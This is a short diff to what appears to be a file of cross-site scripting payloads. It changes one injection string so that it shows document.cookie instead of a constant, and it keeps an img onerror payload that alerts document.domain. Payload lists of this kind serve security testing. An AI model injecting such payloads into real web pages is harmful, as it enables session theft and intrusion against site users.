@@ -3,5 +3,5 @@
     gd3 payloads
 -}
 
-(a"><svg/onload=prompt(1)> )
+(a"><svg/onload=prompt(document.cookie)> )
 "><img src=x onerror=alert(document.domain)>
